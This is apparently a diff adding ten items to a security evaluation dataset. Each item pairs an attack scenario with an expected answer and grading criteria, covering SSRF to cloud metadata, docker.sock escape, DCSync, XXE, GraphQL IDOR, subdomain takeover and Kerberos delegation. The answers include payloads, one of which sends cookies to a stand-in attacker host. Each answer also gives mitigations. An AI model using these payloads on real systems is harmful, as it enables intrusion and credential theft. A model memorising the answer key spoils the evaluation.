@@ -4792,5 +4792,145 @@
     "reasoning_requirement": "Understand GraphQL introspection queries, alias-based enumeration, and authorization testing in API schemas.",
     "evaluation_criteria": "References correct introspection query syntax and parsing. Describes IDOR exploitation with alias-based batching. Mentions authorization validation and impact quantification.",
     "category": "attack_paths"
+  },
+  {
+    "id": 442,
+    "scenario": "Web application accepts user-supplied URLs for generating image thumbnails and fetches them server-side.",
+    "objective": "Cloud credential exfiltration via metadata service",
+    "prompt": "How would an SSRF vulnerability in image thumbnail generation be leveraged to steal cloud provider credentials?",
+    "expected_answer": "SSRF targeting cloud metadata services (AWS 169.254.169.254, GCP metadata.google.internal) extracts temporary credentials. The attacker crafts a malicious URL pointing to http://169.254.169.254/latest/meta-data/iam/security-credentials/, triggering the application to fetch it and return credentials with the attached IAM role's permissions. Exploitation involves: identifying the metadata endpoint path, extracting AccessKeyId and SecretAccessKey from responses, enumerating available roles via /security-credentials/ directory listing, and using credentials to pivot to cloud resources (S3 buckets, RDS databases, Lambda functions). The attacker can then enumerate infrastructure with aws s3 ls, aws ec2 describe-instances, and assess permission scope via iam get-account-summary. Mitigation requires network segmentation blocking 169.254.0.0/16, implementing IMDSv2 (requiring signed requests), applying least-privilege IAM policies, and monitoring metadata service access patterns. Detection focuses on unexpected 169.254.x.x requests in application logs and VPC Flow Logs.",
+    "reasoning_requirement": "SSRF enables metadata service access; credential extraction enables cloud infrastructure compromise.",
+    "evaluation_criteria": [
+      "Identifies correct metadata endpoint and extraction method",
+      "Explains IAM role enumeration and credential usage",
+      "Describes detection and mitigation via network segmentation"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 443,
+    "scenario": "Containerized application for CI/CD automation has docker.sock mounted from the host into the container for orchestrating sibling builds.",
+    "objective": "Container escape and complete host system compromise",
+    "prompt": "Analyze the attack surface when docker.sock is accessible from within a container.",
+    "expected_answer": "Docker socket access grants complete control over the Docker daemon and host system. An attacker inside the container can invoke the Docker API via the mounted socket to create privileged containers with host filesystem mounts, achieving arbitrary code execution on the underlying host. The exploitation chain: detect docker.sock availability (typically /var/run/docker.sock), construct Docker API requests to create a privileged container with volume mount to host root (docker run --privileged -v /:/host), spawn the container, and execute commands with full host filesystem access. Once inside the privileged container, attackers can read sensitive files (/root/.ssh, /etc/shadow), modify host binaries, steal credentials from other containers, or access host processes directly. This attack demonstrates privilege escalation from container user to host root. Mitigation requires: avoiding docker.sock mounts entirely, using Docker API authentication and service account restrictions, implementing Pod Security Standards or seccomp profiles in Kubernetes, monitoring privileged container creation, and enforcing admission controllers to block socket mounts. Detection focuses on unexpected privileged container spawns and docker.sock access from non-privileged processes.",
+    "reasoning_requirement": "Mounted privileged sockets enable daemon control; daemon control enables host compromise via container creation.",
+    "evaluation_criteria": [
+      "Identifies docker.sock API exploitation and container creation attack vector",
+      "Explains privileged mount usage for host filesystem access",
+      "Describes admission controller and Pod Security Standard mitigations"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 444,
+    "scenario": "Service account in Active Directory has been granted 'Replicate Directory Changes' and 'Replicate Directory Changes All' permissions.",
+    "objective": "Complete domain credential dump without direct domain controller access",
+    "prompt": "What attack demonstrates directory replication abuse to extract all domain credentials?",
+    "expected_answer": "DCSync (Domain Controller Synchronization) attack leverages directory replication permissions to extract password hashes and plaintext credentials for all domain objects. When a compromised account possesses Replicate Directory Changes and Replicate Directory Changes All permissions, it can invoke the Directory Replication Service User Interface (DRSUAPI) protocol to request password material from any domain object. Tools like Mimikatz (dcsync command), Secretsdump.py, or custom scripts trigger replication by querying domainDNS objects and extracting NTLM hashes (ntPwdHistory, ntlmPasswordHistory) and plaintext passwords. The attack process: identify compromised account permissions via ACL enumeration, invoke DRSUAPI replication requests for high-value targets (Domain Admins, service accounts, krbtgt), extract password hashes, and perform offline cracking or pass-the-hash attacks. This attack bypasses direct domain controller compromise, working from any network-connected system. Detection requires monitoring DRSUAPI protocol traffic, alerting on replication requests from non-DC sources, and restricting replication permissions to actual domain controllers. Mitigation: apply least-privilege replication permissions, use managed service accounts, implement resource-based delegation, and enable Credential Guard.",
+    "reasoning_requirement": "Directory replication permissions enable password extraction without DC compromise.",
+    "evaluation_criteria": [
+      "Identifies DRSUAPI protocol and dcsync/secretsdump tools",
+      "Explains password hash extraction and offline cracking workflow",
+      "Describes replication permission restriction and Credential Guard deployment"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 445,
+    "scenario": "Web application parses XML documents from user input without restricting external entity declarations; the application has network access to cloud metadata endpoints.",
+    "objective": "Multi-stage exploitation chaining XXE through SSRF to cloud credential theft",
+    "prompt": "Construct the complete attack chain from XXE injection through SSRF to cloud metadata exfiltration.",
+    "expected_answer": "XXE-to-SSRF-to-metadata attacks exploit XML parsing to trigger HTTP requests to cloud endpoints. The attacker crafts a malicious XML document with an external entity definition: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>. When the vulnerable application parses this XML, the entity resolver interprets the entity as a file or URL fetch, triggering an SSRF request to the metadata service. The response (credentials) leaks through XML error messages, DOCTYPE declarations, or out-of-band exfiltration channels. Advanced variants use protocol wrappers: file://, php://, data://, or filter chains to obfuscate payloads and bypass naive XXE filters. The complete chain: inject malicious XML with metadata endpoint reference, trigger application parsing, capture metadata response via XML error message or secondary channel, extract temporary credentials, pivot to cloud infrastructure. Detection requires monitoring for XXE patterns (DOCTYPE, ENTITY), blocking outbound metadata requests, and detecting unusual SSRF-like patterns in logs. Mitigation: disable DOCTYPE parsing, set XML_PARSE_NOENT to false, implement network segmentation, enforce IMDSv2 on AWS, and perform security testing of XML handling code.",
+    "reasoning_requirement": "XXE entity resolution triggers SSRF; SSRF reaches metadata service; metadata response contains credentials.",
+    "evaluation_criteria": [
+      "Constructs valid XXE payload with metadata endpoint",
+      "Explains entity resolution mechanism enabling SSRF",
+      "Describes protocol wrapper obfuscation and out-of-band exfiltration"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 446,
+    "scenario": "GraphQL API exposes user and order objects with introspection enabled; user ID fields are sequential integers.",
+    "objective": "Unauthorized access to all user records via IDOR exploitation",
+    "prompt": "How does GraphQL introspection combined with sequential ID design enable IDOR attacks?",
+    "expected_answer": "GraphQL introspection queries reveal all available types, fields, and queries when enabled, enabling complete schema enumeration. When combined with sequential or predictable ID design, this creates a powerful IDOR vulnerability. The exploitation chain: send introspection query ({__schema{types{name fields{name arguments{name type}}}}} ) to enumerate available objects and queries, identify user-related fields accepting ID parameters (e.g., user(id: ID!)), observe sequential ID patterns in application responses or previous requests, and iterate through ID ranges to fetch unauthorized records. Example payload: {user(id: \"2\") {id name email orders{id total}}} when authenticated as user 1, returning user 2's data. Advanced exploitation involves querying multiple user IDs in batch queries to increase exfiltration speed. Detection requires monitoring for introspection queries, alerting on unusual ID enumeration patterns, and tracking query patterns for sequential ID access. Mitigation: disable introspection in production environments, implement field-level authorization checks verifying that requested resources belong to authenticated user, use globally unique UUIDs instead of sequential IDs, enforce GraphQL query complexity limits, and implement rate limiting on field access.",
+    "reasoning_requirement": "Introspection reveals schema structure; sequential IDs enable enumeration; missing authorization enables unauthorized access.",
+    "evaluation_criteria": [
+      "Constructs valid introspection query and ID enumeration payload",
+      "Identifies batch query technique for accelerated exfiltration",
+      "Describes introspection disabling and field-level authorization controls"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 447,
+    "scenario": "Legacy subdomain DNS record points to deregistered S3 bucket; parent domain uses cookies with domain=.example.com scope.",
+    "objective": "Session hijack via attacker-controlled subdomain takeover",
+    "prompt": "How does a DNS-based subdomain takeover enable session cookie theft when cookies span multiple subdomains?",
+    "expected_answer": "Subdomain takeover exploits orphaned or misconfigured DNS records to take control of attacker-inaccessible subdomains. When the subdomain shares the parent domain's cookie scope, attackers intercept session cookies automatically sent by browsers. The exploitation chain: enumerate DNS records via zone transfers or public sources, identify expired records (legacy.example.com pointing to deleted/unclaimed S3 bucket), register or claim the target service (S3 bucket registration is free when available), host malicious JavaScript code on the controlled subdomain, serve pages that steal cookies. Critical vulnerability: browsers automatically send cookies with domain=.example.com to all subdomains. When attacker controls legacy.example.com, authentication cookies for example.com are sent to the attacker's server. Exfiltration occurs via image beacon (new Image('http://attacker.com/?cookie='+document.cookie)), fetch requests, or WebSocket connections. Once stolen, cookies can be replayed on legitimate subdomains to impersonate users. Detection requires continuous subdomain enumeration services (SubdomainTakeover, Shodan), validating S3 bucket ownership, monitoring DNS changes, and preventing cookie sharing via __Host- prefix (enforces Secure, HttpOnly, and SameSite). Mitigation involves regular DNS auditing and using subdomain takeover detection tools.",
+    "reasoning_requirement": "DNS misconfiguration enables subdomain control; cookie domain scope enables automatic cookie transmission; stolen cookies enable session hijack.",
+    "evaluation_criteria": [
+      "Identifies orphaned DNS record enumeration and S3 bucket registration technique",
+      "Explains cookie domain scope and automatic transmission mechanism",
+      "Describes __Host- prefix mitigation and continuous DNS monitoring"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 448,
+    "scenario": "Attacker registers npm package with name similar to popular library (typosquatted name); legitimate applications install via typo in package.json.",
+    "objective": "Code execution and credential theft via supply chain compromise",
+    "prompt": "Analyze how typosquatting enables supply chain compromise through package manager exploit.",
+    "expected_answer": "Typosquatting attacks exploit developers' typing mistakes when specifying package dependencies. Attackers register packages with similar names to legitimate libraries (e.g., 'requst' instead of 'requests', 'express-async-errors' when targeting 'async-errors'). When npm install runs on the malicious package, npm executes the postinstall script with developer privileges (npm run postinstall hook). The malicious script can: exfiltrate environment variables containing API keys and credentials, steal SSH keys and git credentials from ~/.ssh and ~/.git-credentials, modify source code to inject backdoors, exfiltrate package.json and lock files to identify other dependencies, or install additional malicious packages. The full attack chain: identify popular packages with common typo variants, register the typosquatted name with identical version numbers and similar documentation, implement malicious postinstall script, wait for developers to make typing mistakes. Once installed, the script runs automatically during npm install without developer action. Mitigation requires: pinning exact package versions in package-lock.json, code review of package.json changes, using npm install --ignore-scripts to prevent script execution, running npm audit to detect known malicious packages, and implementing pre-commit hooks to validate dependency changes. Detection involves monitoring outbound connections during install and using package reputation services.",
+    "reasoning_requirement": "Name similarity enables social engineering; install scripts execute automatically; execution grants environment access.",
+    "evaluation_criteria": [
+      "Identifies typosquatted package naming strategy and registration technique",
+      "Explains postinstall script execution and credential exfiltration workflow",
+      "Describes package-lock.json pinning and --ignore-scripts mitigation"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 449,
+    "scenario": "Developer accidentally commits AWS IAM credentials in a configuration file; git history is world-readable via public GitHub repository.",
+    "objective": "Cloud infrastructure compromise via exposed credential access",
+    "prompt": "How do credentials exposed in git history and logs enable cloud infrastructure compromise?",
+    "expected_answer": "Accidentally exposed credentials in git history or application logs provide immediate cloud API access when discoverable. Attack vector: attacker searches GitHub for AWS_KEY patterns using GitHub search or tools like GitGuardian, Trufflehog, or performs shallow git clone and git log -p to extract credentials. Exposed secrets typically include Access Key ID, Secret Access Key, or session tokens. Once obtained, the attacker uses credentials to enumerate cloud infrastructure: aws s3 ls to list accessible S3 buckets, aws ec2 describe-instances to identify running resources, aws rds describe-db-instances for databases, aws iam get-account-summary to assess permission scope. With enumerated infrastructure, attackers execute lateral movement: extract S3 bucket contents containing source code or backups, access RDS databases to steal customer data, assume additional IAM roles with broader permissions (aws sts assume-role), trigger Lambda functions for reverse shells, or modify CloudFormation stacks to persist access. This demonstrates credential lifecycle abuse\u2014temporary credentials may expire, but permanent keys persist indefinitely. Mitigation requires: scanning git history for secrets (TruffleHog, GitGuardian pre-commit hooks), implementation of secret rotation policies, use of AWS Secrets Manager instead of plaintext credentials, enabling MFA on root account, implementing least-privilege IAM policies, monitoring CloudTrail for unusual API patterns, and immediate credential revocation when exposure detected.",
+    "reasoning_requirement": "Exposed credentials grant API access; API access enables infrastructure enumeration and lateral movement.",
+    "evaluation_criteria": [
+      "Identifies git history search patterns and credential discovery tools",
+      "Explains AWS API enumeration (s3 ls, ec2 describe-instances, iam get-account-summary)",
+      "Describes secret rotation, Secrets Manager usage, and CloudTrail monitoring"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 450,
+    "scenario": "Web application accepts URLs for webhook delivery; internal network hosts unprotected Redis and Elasticsearch instances without authentication.",
+    "objective": "Data exfiltration from internal data stores via SSRF exploitation",
+    "prompt": "How can SSRF vulnerabilities be exploited to extract data from unprotected internal services?",
+    "expected_answer": "SSRF-vulnerable webhooks or proxy endpoints become attack vectors when internal services lack authentication. Exploitation chain: identify SSRF vulnerability accepting user-controlled URLs, enumerate internal network ranges using SSRF (10.0.0.0/8, 172.16.0.0/12 via null-byte, alternative protocols, or response-time analysis), probe for common internal service ports (Redis 6379, Elasticsearch 9200, MongoDB 27017), and exploit service-specific protocols to extract data. For Redis SSRF exploitation: send RESP (Redis Serialization Protocol) commands as HTTP request body or URL: KEYS * to enumerate keys, GET key-name to extract values, CONFIG GET to access configuration. Elasticsearch exploitation involves issuing HTTP GET requests: GET /_cat/indices to list indices, GET /index/_search to query documents, GET /_mapping to extract field names. MongoDB exploitation uses MongoDB Wire Protocol commands transmitted via SSRF. Advanced techniques include using gopher:// or dict:// protocols to bypass HTTP-only filtering. Exfiltrated data typically includes user credentials, API keys stored in Redis, customer data in Elasticsearch, and internal configuration. Mitigation requires: network segmentation isolating internal services from SSRF-vulnerable applications, requiring authentication (Redis AUTH, Elasticsearch security), disabling external connectivity from vulnerable services, implementing strict URL whitelisting, using service mesh authorization policies, and monitoring for unexpected internal traffic patterns.",
+    "reasoning_requirement": "SSRF reaches internal services; unprotected services lack authentication; protocol-specific commands extract data.",
+    "evaluation_criteria": [
+      "Identifies internal network enumeration and port scanning via SSRF",
+      "Constructs RESP and Elasticsearch protocol payloads for data extraction",
+      "Describes network segmentation and service authentication mitigations"
+    ],
+    "category": "attack_paths"
+  },
+  {
+    "id": 451,
+    "scenario": "Service account runs with unconstrained Kerberos delegation enabled; attacker has code execution on compromised machine in same domain.",
+    "objective": "TGT theft enabling domain-wide lateral movement via delegation abuse",
+    "prompt": "How does unconstrained Kerberos delegation combined with coercion techniques enable ticket theft and lateral movement?",
+    "expected_answer": "Unconstrained Kerberos delegation allows service accounts to cache user Ticket Granting Tickets (TGTs) without restriction, enabling lateral movement when combined with coercion techniques. The vulnerability: services with TRUSTED_FOR_DELEGATION flag can cache any user's TGT after that user authenticates to them. When domain controllers or other sensitive systems are forced to authenticate to the compromised service (via printer bug, SpoolSample, or PetitPotam), their TGTs are cached. Exploitation chain: identify services with unconstrained delegation (Get-ADComputer -LDAPFilter '*' | Where-Object {$_.TrustedForDelegation}), use printer bug (SpoolSample, CVE-2019-1040) to coerce domain controller authentication to compromised service, intercept cached TGT (tools like Rubeus export cached tickets), execute pass-the-ticket attack using stolen DC TGT. The stolen DC TGT grants access to any resource in the domain. Detection requires monitoring Kerberos delegation settings via LDAP queries, alerting on TGT traffic from non-DC sources, and auditing delegation permission changes. Mitigation: convert unconstrained to constrained delegation (restrict to specific SPNs), remove delegation entirely when unnecessary, implement Kerberos authentication protections (require signing), use managed service accounts without delegation rights, and block printer spooler (SpoolSample) via disabling Print Spooler service on non-printer systems.",
+    "reasoning_requirement": "Unconstrained delegation caches TGTs; coercion forces sensitive system authentication; cached TGTs enable lateral movement.",
+    "evaluation_criteria": [
+      "Identifies unconstrained delegation detection and TRUSTED_FOR_DELEGATION flag",
+      "Explains printer bug coercion and TGT extraction via Rubeus",
+      "Describes constrained delegation and spooler service mitigation strategies"
+    ],
+    "category": "attack_paths"
   }
 ]
